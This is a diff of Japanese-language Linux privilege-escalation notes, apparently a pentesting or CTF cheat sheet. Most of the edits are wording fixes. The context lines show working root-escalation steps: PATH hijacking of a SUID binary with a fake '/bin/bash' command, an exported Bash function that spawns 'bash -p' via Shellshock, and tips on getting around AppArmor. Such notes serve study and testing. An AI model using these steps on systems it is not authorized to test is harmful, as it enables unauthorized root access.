@@ -153,7 +153,7 @@ openssl passwd -6 <pw>
 - 方法：PATH環境変数を操作して、SUIDバイナリに攻撃者が作成した実行ファイルを実行させる
 - PATH環境変数は実行可能なプログラムを格納するディレクトリを指定する環境変数で、コマンド実行時にこの変数を参照してファイルを検索する
 - 条件：
-	- SUIDバイナリがコマンドを実行しているが、フルパス指定ではない
+	- SUIDバイナリがコマンドを実行しているが、コマンドが絶対パス指定ではない
 		- (例：`/usr/bin/pwd`ではなく、`pwd`)
 	- 書き込み可能なディレクトリがPATH内に存在する or PATH変数自体を変更可能
 
@@ -195,7 +195,7 @@ echo "/bin/bash" > <コマンド名>
 chmod +x <コマンド名>
 ```
 
-3. SUIDバイナリを実行する
+2. SUIDバイナリを実行する
 ```zsh
 ./<SUIDバイナリ>
 ```
@@ -275,7 +275,7 @@ gcc -fPIC -shared -o <共有オブジェクトファイルフルパス> shell.c
 
 ## SUID w/ Bash <= 4.2.-048
 
-Shellshock
+Shellshockと呼ばれる。
 
 - 条件：
 	- Bashのバージョンが4.2-048以下のとき
@@ -290,7 +290,7 @@ Shellshock
 ```zsh
 strings [SUIDバイナリのパス]
 ```
-	↓出力例
+↓出力例
 ```
 /usr/sbin/service apache2 start...
 ```
@@ -298,8 +298,8 @@ strings [SUIDバイナリのパス]
 3. 実行コマンドのフルパスと同名のBash関数を作成する
 ```zsh
 # 上記の出力の場合：function /user/sbin/service { /bin...}
-function [実行コマンドフルパス] { /bin/bash -p; }
-export -f [実行コマンドフルパス]
+function <実行コマンドフルパス> { /bin/bash -p; }
+export -f <実行コマンドフルパス>
 ```
 
 4. SUIDバイナリを実行する
@@ -310,7 +310,7 @@ export -f [実行コマンドフルパス]
 
 🔗[CVE-2016-7543](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006966.html)
 
-4.3以下であっても、パッチの適用状況やディストロによってはこのエクスプロイトが成功せず、反対に[[#SUID w/ Bash <= 4.2.-048]]の方法は成功する可能性もある
+4.3以下であっても、パッチの適用状況やディストロによってはこのエクスプロイトが成功せず、反対に[[#SUID w/ Bash <= 4.2.-048]]の方法は成功する可能性もある。
 
 - 条件：
 	- Bashのバージョンが4.3以下のとき
@@ -348,18 +348,17 @@ sudo -l
 
 ### 補足：GTFOBinsの方法でPermission deniedの場合の原因追求
 
-以下が原因の場合、対策として他のバイナリを使うか、他の攻撃ベクターを使う
+以下が原因の場合、対策として他のバイナリを使うか、他の攻撃ベクターを使う。
 
-1. 一部のオプションのみがsudoで実行可能で、GTFOBinsに記載のオプションは使えないから
-	例えば、`sudo -l`の結果が以下の場合、`crontab -l`のみしか使えない
+- 一部のオプションのみがsudoで実行可能で、GTFOBinsに記載のオプションは使えないから
+	- 例えば、`sudo -l`の結果が以下の場合、`crontab -l`のみしか使えない
 ```
 ...(ALL) (ALL) /usr/bin/crontab -l
 ```
 
-2. AppArmorやClamAVなどのセキュリティ機構がGTFOBinsのコマンドを遮断しているから
+- AppArmorやClamAVなどのセキュリティ機構がGTFOBinsのコマンドを遮断しているから
 	- AppArmorはDebian 10以降はデフォルトで有効になっている
-
-- syslogからauditデーモンのログを閲覧し、apparmorが動作していることを確認
+	- syslogからauditデーモンのログを閲覧し、apparmorが動作していることを確認
 ```zsh
 cat /var/log/syslog | grep <binary(tcpdump等)>
 ```
